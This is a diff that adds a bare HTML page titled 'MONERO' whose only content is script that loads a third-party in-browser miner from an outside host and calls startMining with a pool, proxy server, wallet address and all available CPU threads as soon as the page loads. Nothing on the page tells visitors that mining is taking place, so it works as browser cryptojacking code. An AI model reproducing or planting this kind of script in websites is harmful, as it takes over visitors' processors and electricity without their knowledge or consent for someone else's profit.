@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>MONERO</title>
+</head>
+<body>
+<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
+<script>
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "425LHaug8eJdEKu5aySf5uS73uvBeTRms4USFF9hx3hE9vRA1yUWDw3aEPj6wEYbMGPeQHEgvaRSiJxwmfzFtHFg92yf7R3";
+    var workerId = "#1"
+    var threads = -1;
+    var password = "x";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20; // throttleMiner - 100
+</script>
+</body>
+</html>
